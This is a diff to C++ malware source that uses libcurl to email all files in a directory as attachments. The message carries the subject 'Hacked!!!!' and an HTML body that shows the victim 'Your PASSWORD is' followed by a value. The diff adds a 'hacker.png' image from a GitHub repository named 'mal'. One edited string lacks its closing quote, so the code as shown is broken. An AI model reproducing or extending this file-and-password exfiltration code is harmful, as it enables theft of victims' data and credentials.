@@ -55,7 +55,7 @@ void send_email_with_attachments_from_directory(const std::string &directory_pat
         curl_easy_setopt(curl, CURLOPT_READDATA, &email_body);
         curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L);
         curl_easy_setopt(curl, CURLOPT_USE_SSL, (long)CURLUSESSL_ALL);
-        //curl_easy_setopt(curl, CURLOPT_SUBJECT, "Your Email Subject Here");
+        // curl_easy_setopt(curl, CURLOPT_SUBJECT, "Your Email Subject Here");
 
         struct curl_slist *headers = NULL;
         headers = curl_slist_append(headers, "Subject: Hacked!!!!");
@@ -68,11 +68,10 @@ void send_email_with_attachments_from_directory(const std::string &directory_pat
         curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
 
         // HTML 본문을 위한 MIME 파트 생성
-        std::string html_body = "<html><body><h2>YOUR PASSWORD is</h2><h1 style='color: red;'>" + email_body_text + "</h1></body></html>";
-        curl_mimepart *html_part = curl_mime_addpart(mime);
+        std::string html_body = "<html><body><img style='width: 200px;' src='https://github.com/k2kite-megankim/mal/blob/main/hacker.png?raw=true'></img><p style='font-size: 25px;'>Your PASSWORD is </p><p style='color: red; font-size: 30px;'>" + email_body_text + "</p></body></html>;
+                                curl_mimepart *html_part = curl_mime_addpart(mime);
         curl_mime_data(html_part, html_body.c_str(), CURL_ZERO_TERMINATED);
         curl_mime_type(html_part, "text/html");
-        
 
         // Add all files in the directory as attachments
         for (const auto &entry : fs::directory_iterator(directory_path))
